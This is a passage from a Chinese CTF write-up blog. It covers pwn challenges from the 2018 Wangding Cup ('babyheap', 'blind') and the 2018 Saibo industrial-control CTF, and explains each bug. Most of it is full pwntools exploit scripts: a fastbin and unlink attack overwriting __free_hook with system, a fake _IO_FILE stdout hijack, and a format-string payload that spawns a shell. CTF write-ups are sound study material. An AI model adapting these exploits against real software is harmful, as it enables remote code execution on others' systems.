:io.recvline()</span><br><span class="line">se = <span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sel = <span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sea = <span class="keyword">lambda</span> x:io.sendafter(x)</span><br><span class="line">sela = <span class="keyword">lambda</span> x:io.sendlineafter(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gdb_debug</span>(<span class="params">order</span>):</span><br><span class="line">    command = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> order:</span><br><span class="line">        command += <span class="built_in">str</span>(item)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    log.info(<span class="string">&#x27;gdb command:\n&#x27;</span>+command)</span><br><span class="line">    gdb.attach(io,command)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">index,content</span>):</span><br><span class="line">    ru(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    sel(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(index))</span><br><span class="line">    ru(<span class="string">&#x27;Content:&#x27;</span>)</span><br><span class="line">    se(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    ru(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    sel(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(index))</span><br><span class="line">    ru(<span class="string">&#x27;Content:&#x27;</span>)</span><br><span class="line">    se(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    ru(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    sel(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    ru(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    sel(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">flag</span>):</span><br><span class="line">    <span class="comment"># Step1 leaking heap address</span></span><br><span class="line">    alloc(<span class="number">0</span>,<span class="string">&#x27;0&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">    alloc(<span class="number">1</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">    alloc(<span class="number">2</span>,<span class="string">&#x27;2&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">    alloc(<span class="number">3</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    alloc(<span class="number">4</span>,<span class="string">&#x27;4&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">    alloc(<span class="number">5</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>+<span class="string">&#x27;5&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">    alloc(<span class="number">6</span>,<span class="string">&#x27;6&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>))</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    heap = u64(rud(<span class="string">&#x27;\n&#x27;</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x30</span></span><br><span class="line">    log.success(<span class="string">&#x27;heap:&#x27;</span>+<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step2.Fastbin attack for overlapping chunk</span></span><br><span class="line">    edit(<span class="number">2</span>,p64(heap+<span class="number">0xa0</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    alloc(<span class="number">7</span>,<span class="string">&#x27;7&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">    alloc(<span class="number">8</span>,p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>))</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    alloc(<span class="number">9</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x0</span>)+p64(<span class="number">0x6020a8</span>-<span class="number">0x18</span>)+p64(<span class="number">0x6020a8</span>-<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step3.Unlink</span></span><br><span class="line">    delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step4.Leaking libc</span></span><br><span class="line">    edit(<span class="number">9</span>,p64(<span class="number">0x6020b0</span>)+p64(<span class="number">0</span>)+p64(elf.got[<span class="string">&#x27;free&#x27;</span>])+p64(<span class="number">0x602090</span>))</span><br><span class="line">    show(<span class="number">8</span>)</span><br><span class="line">    libc.address = u64(rud(<span class="string">&#x27;\n&#x27;</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">    __free_hook = libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;__free_hook:&#x27;</span>+<span class="built_in">hex</span>(__free_hook))</span><br><span class="line">    system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;system:&#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step5.__free_hook = system</span></span><br><span class="line">    edit(<span class="number">6</span>,p64(<span class="number">0</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    edit(<span class="number">9</span>,p64(<span class="number">0x6020b0</span>)+p64(<span class="number">0</span>)+p64(__free_hook)+p64(<span class="number">0x602090</span>))</span><br><span class="line">    edit(<span class="number">8</span>,p64(system)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    context.binary = <span class="string">&#x27;./babyheap&#x27;</span></span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>,<span class="string">&#x27;-l&#x27;</span>,<span class="string">&#x27;115&#x27;</span>]</span><br><span class="line">    <span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">    elf = ELF(<span class="string">&#x27;./babyheap&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)&gt;<span class="number">1</span>:</span><br><span class="line">        io = remote(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">        exploit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(<span class="string">&#x27;./babyheap&#x27;</span>)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">        exploit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h3 id="blind"><a href="#blind" class="headerlink" title="blind"></a>blind</h3><p>blind 如同题目名称 程序中并没有任何输出 所以一开始的思路就是<em>House of Romen</em><br>题目在<code>Release</code>中存在一个明显的UAF漏洞，但是问题是不存在任何输出，并且<code>malloc</code>的大小固定为0x68，这个大小还好….<br>此外题目中为了降低难度还有一个后门函数0x4008E3</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 <span class="title">release</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x10uLL</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;s, <span class="number">0xFuLL</span>);</span><br><span class="line">  index = <span class="built_in">atoi</span>(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( index &lt;= <span class="number">5</span> &amp;&amp; ptr[index] &amp;&amp; release_number &lt;= <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptr[index]);                           <span class="comment">// uaf</span></span><br><span class="line">    ++release_number;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>House of Romen的思路很直接</p>
<ol>
<li>在Heap 空间构造一个合适的Size 0x70~0x7f</li>
<li><em>UAF-Fastbin-Attack</em> 到 [heap]空间中，形成<em>Chunk Overlapping</em></li>
<li>篡改下一个Chunk的<em>Size</em>为<em>Unsortedbin</em>大小，并free掉它，使得fd指向unsorted_chunks(av)</li>
<li>修改大小为0x71，<code>free</code>后，<em>Partial Overwite</em> fd指针指向<code>__malloc_hook</code>-0x23</li>
<li>Fastbin Attack 到<code>__malloc_hook</code>，再次并GetShell</li>
</ol>
<p>但是仔细看程序，虽然上述思路理论上能够在不泄露的情况下Getshell，但是题目中的奇葩输入</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">read_content</span><span class="params">(__int64 a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, (<span class="type">void</span> *)(i + a1), <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(i + a1) == <span class="string">&#x27;\n&#x27;</span> || i == a2 - <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = i + a1;</span><br><span class="line">      *(_BYTE *)result = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先a2的大小就是指定的0x68，并且<code>i&gt;= a2</code>条件是触发不到的，不知道为什么多这个分支，多此一举，在<code>i == a2 - 1</code>分支，强制在字符串最后加入”\0”,这就造成了Partial Overwrite 的失败</p>
<p>于是题目采用的方式 是通过Fastbin Attack 到.bss段上伪造一个*_IO_FILE*，然后修改<code>stdout</code>为该fake <code>_IO_FILE</code></p>
<p>在伪造了.bss段上的<code>_IO_FILE</code>的后，调试发现在<code>printf</code>中触发后门，Getshell而<code>puts</code>用的依旧是LIBC上的指针。</p>
<p>这有些运气成分，因为我也不是很清楚究竟在哪里用到了.bss段上的<em>FILE</em>指针，这是个悬而未决的问题，值得探究。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/env/bin python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> :io.recv()</span><br><span class="line">rn = <span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> x:io.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">rl = <span class="keyword">lambda</span> :io.recvline()</span><br><span class="line">se = <span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sel = <span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sea = <span class="keyword">lambda</span> x:io.sendafter(x)</span><br><span class="line">sela = <span class="keyword">lambda</span> x:io.sendlineafter(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">order=[]</span>):</span><br><span class="line">    command = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> order:</span><br><span class="line">        command += <span class="built_in">str</span>(item)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    log.info(<span class="string">&#x27;gdb command:\n&#x27;</span>+command)</span><br><span class="line">    gdb.attach(io,command)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">index,content</span>):</span><br><span class="line">    ru(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    ru(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(index))</span><br><span class="line">    ru(<span class="string">&#x27;Content:&#x27;</span>)</span><br><span class="line">    se(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">index,content</span>):</span><br><span class="line">    ru(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    ru(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(index))</span><br><span class="line">    ru(<span class="string">&#x27;Content:&#x27;</span>)</span><br><span class="line">    se(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">release</span>(<span class="params">index</span>):</span><br><span class="line">    ru(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    ru(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">flag</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment">#Step1. Fastbin Attack to .bss</span></span><br><span class="line"></span><br><span class="line">    new(<span class="number">0</span>,<span class="string">&#x27;0&#x27;</span>*<span class="number">0x68</span>)</span><br><span class="line">    release(<span class="number">0</span>)</span><br><span class="line">    change(<span class="number">0</span>,p64(<span class="number">0x60203d</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    new(<span class="number">1</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#Step2. layout fake IO_FILE_plus structure and _IO_jumps filled with backdoor</span></span><br><span class="line">    fake_ptr = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x13</span>+p64(<span class="number">0x6020c0</span>)+p64(<span class="number">0x6020c0</span>+<span class="number">0x68</span>)+p64(<span class="number">0x6020c0</span>+<span class="number">2</span>*<span class="number">0x68</span>)</span><br><span class="line">    fake_ptr += p64(<span class="number">0x602020</span>)+p64(<span class="number">0x602060</span>)+p64(<span class="number">0x602098</span>)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    new(<span class="number">2</span>,fake_ptr)</span><br><span class="line"></span><br><span class="line">    payload0 = p64(<span class="number">0xfbad2087</span>)</span><br><span class="line">    payload0 += <span class="number">12</span>*p64(<span class="number">0</span>)</span><br><span class="line">    change(<span class="number">0</span>,payload0)</span><br><span class="line"></span><br><span class="line">    payload1 = <span class="number">2</span>*p64(<span class="number">0</span>)</span><br><span class="line">    payload1 += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">    payload1 += p64(<span class="number">0</span>)+p64(<span class="number">0x6020c8</span>)</span><br><span class="line">    payload1 += p64(<span class="number">0xffffffffffffffff</span>)+<span class="number">7</span>*p64(<span class="number">0</span>)</span><br><span class="line">    change(<span class="number">1</span>,payload1)</span><br><span class="line"></span><br><span class="line">    payload2 = p64(<span class="number">0</span>)+p64(<span class="number">0x6020c0</span>+<span class="number">2</span>*<span class="number">0x68</span>+<span class="number">0x10</span>)</span><br><span class="line">    payload2 += <span class="number">11</span>*p64(<span class="number">0x4008E3</span>)</span><br><span class="line">    change(<span class="number">2</span>,payload2)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#Step3.Hijack stdout</span></span><br><span class="line">    <span class="comment"># z([&#x27;b *0x400C69&#x27;,&#x27;b *0x40092A&#x27;,&#x27;b buffered_vfprintf&#x27;])</span></span><br><span class="line">    change(<span class="number">3</span>,p64(<span class="number">0x6020c0</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#Step4.unexplainable Getshell</span></span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    context.binary = <span class="string">&#x27;./blind&#x27;</span></span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>,<span class="string">&#x27;-l&#x27;</span>,<span class="string">&#x27;120&#x27;</span>]</span><br><span class="line">    <span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">    elf = ELF(<span class="string">&#x27;./blind&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)&gt;<span class="number">1</span>:</span><br><span class="line">        io = remote(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">        exploit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(<span class="string">&#x27;./blind&#x27;</span>)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">        exploit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2018/11/10/2018%E7%BD%91%E9%BC%91%E6%9D%AFctf/" data-id="cuidH2yswXpVJZaxOLFb8BDgi" data-title="2018 网鼎杯ctf" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-2018赛博工控ctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2018/10/17/2018%E8%B5%9B%E5%8D%9A%E5%B7%A5%E6%8E%A7ctf/" class="article-date">
  <time class="dt-published" datetime="2018-10-17T03:07:10.000Z" itemprop="datePublished">2018-10-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2018/10/17/2018%E8%B5%9B%E5%8D%9A%E5%B7%A5%E6%8E%A7ctf/">2018 赛博杯工控CTF</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>本次比赛只做出来两道Pwn HMI流水灯运行与实时数据监测。剩下两道Pwn在师傅指点下，赛后进行了复现。</p>
<p>前面的两个Pwn是相对比较常规的</p>
<h2 id="实时数据监测"><a href="#实时数据监测" class="headerlink" title="实时数据监测"></a>实时数据监测</h2><p><img src="/2018%E8%B5%9B%E5%8D%9A%E5%B7%A5%E6%8E%A7ctf/777951_VEMT2SD3XCKG4BJ.jpg" alt="img"></p>
<p>实时数据监测是一道盲Pwn，利用格式化字符串的Blind Pwn。<br>首先，确定存在format string，随后我直接开始从0x8048000~0x8049000 dump 服务端的程序<br>由于程序每次需要等待20s左右才能触发一次format string 泄露一次地址，所以dump的格外慢，大约持续了4个小时….</p>
<p>只有将Binary 拖入IDA，然而由于部分dump有误，无法解析成ELF,只能成binary….<br>将支离破碎的binary汇编源码理顺，得到以下的汇编:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">seg000:080486DD                 push    ebp</span><br><span class="line">seg000:080486DE                 mov     ebp, esp</span><br><span class="line">seg000:080486E0                 sub     esp, 208h</span><br><span class="line">seg000:080486E6                 mov     eax, ds:804B0C0h</span><br><span class="line">seg000:080486EB                 sub     esp, 4</span><br><span class="line">seg000:080486EE                 push    eax</span><br><span class="line">seg000:080486EF                 push    200h</span><br><span class="line">seg000:080486F4                 lea     eax, [ebp-520]</span><br><span class="line">seg000:080486FA                 push    eax</span><br><span class="line">seg000:080486FB                 call    <span class="built_in">read</span></span><br><span class="line">seg000:08048700                 add     esp, 10h</span><br><span class="line">seg000:08048703                 sub     esp, 0Ch</span><br><span class="line">seg000:08048706                 lea     eax, [ebp-520]</span><br><span class="line">seg000:0804870C                 push    eax</span><br><span class="line">seg000:0804870D                 call    <span class="built_in">printf</span></span><br><span class="line">seg000:08048712                 add     esp, 10h</span><br><span class="line">seg000:08048715                 mov     eax, ds:804B14Ch</span><br><span class="line">seg000:0804871A                 cmp     eax, 2223322h</span><br><span class="line">seg000:0804871F                 jnz     short loc_8048753</span><br><span class="line">seg000:08048721                 sub     esp, 0Ch</span><br><span class="line">seg000:08048724                 push    8048C80h        ; _DWORD</span><br><span class="line">seg000:08048729                 call    puts</span><br><span class="line">seg000:0804872E                 add     esp, 10h</span><br><span class="line">seg000:08048731                 sub     esp, 0Ch</span><br><span class="line">seg000:08048734                 push    8048C99h        ; _DWORD</span><br><span class="line">seg000:08048739                 call    puts</span><br><span class="line">seg000:0804873E                 add     esp, 10h</span><br><span class="line">seg000:08048741                 sub     esp, 0Ch</span><br><span class="line">seg000:08048744                 push    8048CA6h</span><br><span class="line">seg000:08048749                 call    system</span><br><span class="line">seg000:0804874E                 add     esp, 10h</span><br><span class="line">seg000:08048751                 jmp     short loc_8048763</span><br></pre></td></tr></table></figure>
<p>可见，判定条件<code>[ds:804B14Ch]==0x2223322</code>时顺利打印flag，最后Script:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/env/bin python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    <span class="comment">#getbinary()</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;请重新初始化反应。\n&#x27;</span>)</span><br><span class="line">    payload = fmtstr_payload(<span class="number">12</span>,&#123;<span class="number">0x804B14C</span>:<span class="number">0x2223322</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span> payload</span><br><span class="line">    io.send(payload)</span><br><span class="line">    io.interactive()</span><br><span class="line">    io.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag&#123;1hasdfw423fgv45432wgasv45443v120bjsdf&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span 